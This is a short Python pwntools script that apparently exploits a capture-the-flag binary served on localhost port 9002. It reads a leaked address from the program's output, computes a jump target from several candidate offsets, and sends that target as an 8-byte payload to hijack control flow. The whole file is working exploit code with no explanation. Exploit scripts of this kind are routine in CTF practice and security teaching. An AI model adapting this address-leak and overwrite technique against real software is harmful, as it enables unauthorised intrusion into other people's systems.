from pwn import *

# p = process(['./challenge'])
for branch in [0x1582, 0x159b, 0x15b4]:
    p = remote('127.0.0.1', 9002)
    p.sendline(b'name')
    p.sendline(b'b')
    result = p.recvuntil(b', did you')
    address = result[result.rfind(b'Exit\n') + len(b'Exit\n'):-len(b', did you')]
    address = int.from_bytes(address, 'little') - branch + 0x169f
    payload = address.to_bytes(8, 'little')
    p.sendline(b'a')
    p.sendline(payload)
    print(p.clean())
    p.close()
    # p.interactive()
